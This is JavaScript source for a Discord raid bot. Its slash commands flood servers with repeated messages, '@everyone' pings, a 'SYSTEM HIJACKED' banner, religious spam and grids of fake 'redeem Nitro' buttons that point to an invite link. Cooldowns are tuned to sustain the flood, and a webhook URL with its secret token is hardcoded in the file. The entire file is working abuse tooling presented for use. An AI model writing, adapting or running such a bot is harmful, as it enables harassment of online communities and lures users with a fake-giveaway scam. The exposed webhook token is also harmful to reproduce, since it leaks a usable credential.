const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ComponentType } = require('discord.js');
const https = require('https');

const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const ALLOWED = ['1319018100217086022', '1421829036916736040', '1440641528321151099'];
const WEBHOOK_LOG = "https://discord.com/api/webhooks/1451307117461114920/TdCzoUuwTUdOTewAWBZLw7cXeo275xJMrC2feDHzMB6_zBfdXZ81G-pEYr0G5S9fy9jl";
const INVITE = "https://discord.gg/ure7pvshFW";

// Controle de tarefas ativas para o botão de paragem
const activeTasks = new Map();

// Texto Religioso Restaurado
const GOD_TEXT = `# If you do not believe in God then change your ways. Philippians 4:13 *** "I can do all things through Christ who strengthens me"***\n\n# *** John 3:16 "For God so loved the world, that he gave his only Son, that whoever believes in him should not perish but have eternal life"***\n\n# ****GOD IS KING****\n# ****GOD IS KING****\n# ****GOD IS KING****\n# ****GOD IS KING****\n# ****GOD IS KING****\n-# @everyone @here\nhttps://tenor.com/view/jesus-edit-edit-jesus-christ-is-king-christ-edit-gif-15902634079600751945`;

const getDynamicCooldown = (i) => {
    if (i === 0) return 1000;      // 1ª para 2ª: 1s
    if (i < 9) return 2500;        // 3ª até 10ª: 2.5s
    return 2800;                   // 10ª em diante: 2.8s
};

const getMassiveButtons = () => {
    const rows = [];
    for (let i = 0; i < 5; i++) {
        const row = new ActionRowBuilder();
        for (let j = 0; j < 5; j++) {
            row.addComponents(new ButtonBuilder().setLabel("🎁 RESGATAR NITRO").setStyle(ButtonStyle.Link).setURL(INVITE));
        }
        rows.push(row);
    }
    return rows;
};

module.exports = async (TOKEN, CLIENT_ID) => {
    const client = new Client({ intents: [GatewayIntentBits.Guilds] });
    const rest = new REST({ version: '10' }).setToken(TOKEN);

    // Remoção dos comandos de mudar modo (bot_mode)
    const commands = [
        new SlashCommandBuilder().setName('raid').setDescription('RAID MASSIVA (25 BTNS)').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('say').setDescription('Repete Mensagem').setIntegrationTypes([1]).setContexts([0,1,2])
            .addStringOption(o=>o.setName('t').setRequired(true).setDescription('Texto'))
            .addIntegerOption(o=>o.setName('q').setRequired(true).setDescription('Quantidade')),
        new SlashCommandBuilder().setName('button_spam').setDescription('FLOOD DE 50 BOTÕES').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('god').setDescription('RAID RELIGIOSA ORIGINAL').setIntegrationTypes([1]).setContexts([0,1,2])
    ].map(c => c.toJSON());

    client.once('ready', () => {
        rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        if (CLIENT_ID === process.env.CLIENT_ID_1) {
            const data = JSON.stringify({ content: "# 🚀 SISTEMA PRINCIPAL ONLINE" });
            const req = https.request(WEBHOOK_LOG, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
            req.write(data); req.end();
        }
    });

    client.on('interactionCreate', async interaction => {
        if (!interaction.isChatInputCommand()) return;
        const { commandName, options, user, id: interactionId } = interaction;

        if (!ALLOWED.includes(user.id)) return;

        // Inicia controle de tarefa
        activeTasks.set(interactionId, true);

        // Mensagem Efêmera de Controle (Só o usuário vê)
        const stopBtn = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`stop_${interactionId}`).setLabel('PARAR EXECUÇÃO').setStyle(ButtonStyle.Danger)
        );

        await interaction.reply({ content: '💀 **Protocolo Iniciado.**', components: [stopBtn], ephemeral: true });

        // Handler para o botão de paragem
        const collector = interaction.channel.createMessageComponentCollector({ 
            componentType: ComponentType.Button, 
            filter: i => i.customId === `stop_${interactionId}` && i.user.id === user.id,
            time: 600000 
        });

        collector.on('collect', async i => {
            activeTasks.set(interactionId, false);
            await i.update({ content: '🛑 **EXECUÇÃO INTERROMPIDA PELO USUÁRIO.**', components: [] });
            collector.stop();
        });

        // --- EXECUÇÃO DE COMANDOS ---

        if (commandName === 'raid' || commandName === 'button_spam') {
            const btns = getMassiveButtons();
            for(let i=0; i < 20; i++) {
                if (!activeTasks.get(interactionId)) break; // Verifica se deve parar
                
                await interaction.followUp({ 
                    content: commandName === 'raid' ? `# **S̶Y̶S̶T̶E̶M̶ ̶H̶I̶J̶A̶C̶K̶E̶D̶**` : "### ⚠️ **AÇÃO OBRIGATÓRIA**", 
                    components: btns 
                }).catch(() => {});
                
                await wait(getDynamicCooldown(i));
            }
        }

        if (commandName === 'say') {
            const t = options.getString('t');
            const q = options.getInteger('q');
            for(let i=0; i < q; i++) {
                if (!activeTasks.get(interactionId)) break;
                await interaction.followUp({ content: t }).catch(() => {});
                await wait(getDynamicCooldown(i));
            }
        }

        if (commandName === 'god') {
            for(let i=0; i < 15; i++) {
                if (!activeTasks.get(interactionId)) break;
                await interaction.followUp({ content: GOD_TEXT }).catch(() => {});
                await wait(getDynamicCooldown(i));
            }
        }
        
        activeTasks.delete(interactionId);
    });

    client.login(TOKEN).catch(() => {});
};
